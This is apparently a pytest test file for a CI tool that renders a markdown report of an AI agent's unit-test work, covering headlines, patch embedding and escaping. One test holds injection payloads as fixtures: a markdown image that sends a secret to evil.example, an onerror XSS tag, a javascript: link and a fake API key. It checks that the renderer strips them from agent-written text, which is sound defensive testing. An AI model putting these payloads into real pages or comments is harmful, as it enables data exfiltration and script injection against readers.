import json

import pytest

ANALYSIS = {
    "summary": {"files_changed": 3, "write_tests": 1, "review": 1, "none": 0, "skip": 1, "agent_required": True},
    "baseline": {"backend": {"status": "passed", "tests": {"failed": 0}}},
    "files": [
        {"path": "backend/app/features/todos/router.py", "kind": "source", "action": "write_tests",
         "coverage": {"tracked": True, "lines_pct": 80, "executable_changed_count": 4,
                      "uncovered_changed_count": 3, "uncovered_changed_lines": "10-12"}},
        {"path": "frontend/src/lib/http.ts", "kind": "source", "action": "review",
         "coverage": {"tracked": True, "lines_pct": 100, "executable_changed_count": 2,
                      "uncovered_changed_count": 0, "uncovered_changed_lines": ""}},
        {"path": "README.md", "kind": "other", "action": "skip"},
    ],
}
AFTER = {"files": [
    {"path": "backend/app/features/todos/router.py", "kind": "source",
     "coverage": {"tracked": True, "lines_pct": 100, "executable_changed_count": 4,
                  "uncovered_changed_count": 0, "uncovered_changed_lines": ""}},
    {"path": "frontend/src/lib/http.ts", "kind": "source",
     "coverage": {"tracked": True, "lines_pct": 100, "executable_changed_count": 2,
                  "uncovered_changed_count": 0, "uncovered_changed_lines": ""}},
]}
AGENT = {
    "completed": True, "model": "claude-opus-5-5", "claude_code_version": "2.1.308",
    "skills_used": ["analyze-pr-changes", "backend-unit-tests", "run-tests"],
    "commands": ["python3 .claude/skills/run-tests/scripts/run_tests.py backend/tests"],
    "files_written": ["backend/tests/features/todos/test_router.py"],
    "permission_denials": [],
    "result": {"subtype": "success", "num_turns": 12, "duration_ms": 120000, "total_cost_usd": 0.8,
               "structured_output": {
                   "outcome": "tests_added", "summary": "Added router tests.",
                   "decisions": [{"file": "backend/app/features/todos/router.py", "decision": "created_tests",
                                  "test_files": ["backend/tests/features/todos/test_router.py"],
                                  "reason": "New endpoint was untested."}],
                   "suspected_bugs": []}},
}
GUARD = {"ok": True, "files": [{"path": "backend/tests/features/todos/test_router.py"}], "violations": [], "warnings": []}
VERIFY = {"ok": True, "suites": {
    "backend": {"status": "passed", "runs": 2, "tests": {"total": 90, "passed": 90, "failed": 0, "skipped": 0},
                "failures": [], "flaky": [], "coverage": {"totals": {"lines_pct": 100}}},
}, "typecheck": {"status": "passed"}}


def context(**overrides):
    ctx = {"analysis": ANALYSIS, "analysis_after": AFTER, "agent": AGENT, "guard": GUARD, "verify": VERIFY,
           "publish": {"status": "committed", "commit": "abcdef1234567890"}, "patch": "diff --git a b",
           "format_status": "passed", "run_url": "https://github.com/o/r/actions/runs/1"}
    ctx.update(overrides)
    return ctx


def test_full_report_contains_decisions_verification_coverage_and_skills(report):
    text = report.render(context())
    assert text.startswith("<!-- unit-test-agent-report -->")
    assert "verified and committed** in abcdef123456" in text
    assert "| `backend/app/features/todos/router.py` | write_tests | 🆕 created tests |" in text
    assert "⚠️ not addressed" in text
    assert "3/6 before → **6/6 after**" in text
    assert "| backend | ✅ passed | 90 | 0 | 0 | 2 | 100% |" in text
    assert "`analyze-pr-changes` → `backend-unit-tests` → `run-tests`" in text
    assert "[Workflow run](https://github.com/o/r/actions/runs/1)" in text
    assert "Generated patch" not in text


@pytest.mark.parametrize("overrides, expected", [
    ({"analysis": None}, "The change analysis failed"),
    ({"analysis": {**ANALYSIS, "summary": {**ANALYSIS["summary"], "agent_required": False}}}, "No unit-testable code"),
    ({"agent": None}, "The agent did not finish"),
    ({"agent": {**AGENT, "completed": False, "result": {"subtype": "error_max_turns"}}}, "error\\_max\\_turns"),
    ({"guard": {**GUARD, "ok": False, "violations": [{"rule": "path_not_allowed", "path": "x", "detail": "d"}]}},
     "policy gate rejected"),
    ({"verify": {**VERIFY, "ok": False}}, "failed independent verification"),
    ({"guard": {**GUARD, "files": []}}, "produced no file changes"),
    ({"guard": {**GUARD, "files": []}, "agent": {**AGENT, "result": {
        "structured_output": {"outcome": "no_changes_needed"}}}}, "No test changes needed"),
    ({"agent": {**AGENT, "result": {"structured_output": {"outcome": "blocked"}}}}, "reported that it was blocked"),
    ({"publish": {"status": "stale"}}, "branch moved"),
    ({"publish": {"status": "push_failed"}}, "could not be pushed"),
    ({"publish": None}, "Apply the patch below"),
])
def test_headline_reflects_the_pipeline_state(report, overrides, expected):
    assert expected in report.headline(context(**overrides))


def test_patch_is_embedded_only_when_verified_and_not_committed(report):
    assert "Generated patch" in report.render(context(publish={"status": "stale"}))
    assert "Generated patch" not in report.render(context(publish={"status": "stale"}, verify={**VERIFY, "ok": False}))


@pytest.mark.parametrize("payload, forbidden", [
    ("![x](https://evil.example/?d=secret)", "https://evil"),
    ("<img src=x onerror=alert(1)>", "<img"),
    ("ping @maintainer", "@maintainer"),
    ("token sk-ant-api03-abcdefghijklmnopqrstuvwxyz", "sk-ant-api03"),
    ("| fake | table |", "| fake |"),
    ("[click](javascript:alert(1))", "](javascript"),
])
def test_agent_text_is_neutralized(report, payload, forbidden):
    agent = json.loads(json.dumps(AGENT))
    agent["result"]["structured_output"]["summary"] = payload
    agent["result"]["structured_output"]["decisions"][0]["reason"] = payload
    agent["result"]["structured_output"]["suspected_bugs"] = [{"file": "x.py", "description": payload}]
    assert forbidden not in report.render(context(agent=agent))


def test_identical_failures_are_grouped(report):
    failures = [{"test": f"page > case {i}", "message": "Error: No QueryClient set\n    at useQueryClient"} for i in range(5)]
    failures.append({"test": "other > case", "message": "AssertionError: expected 1 to be 2"})
    assert report.grouped_failures(failures) == [
        "page > case 0 (+4 more with the same error)\n    Error: No QueryClient set\n        at useQueryClient",
        "other > case\n    AssertionError: expected 1 to be 2",
    ]


def test_unsafe_paths_are_not_rendered_as_code(report):
    assert report.path_cell("backend/app/x.py") == "`backend/app/x.py`"
    assert report.path_cell("a`b <script>") == "a\\`b &lt;script&gt;"


def test_code_blocks_cannot_be_escaped(report):
    block = report.code_block(["````", "text"])
    assert block.startswith("`````") and block.endswith("`````")


def test_untrusted_run_urls_are_not_linked(report):
    assert "evil" not in report.render(context(run_url="https://evil.example/actions/runs/1"))


def test_long_reports_are_truncated(report, monkeypatch):
    monkeypatch.setattr(report, "MAX_COMMENT_CHARS", 500)
    assert report.render(context()).endswith("report truncated; see the workflow artifacts.\n")


def test_cli_tolerates_missing_artifacts(report, tmp_path):
    output = tmp_path / "report.md"
    assert report.main(["--analysis", str(tmp_path / "missing.json"), "--output", str(output)]) == 0
    assert "The change analysis failed" in output.read_text(encoding="utf-8")
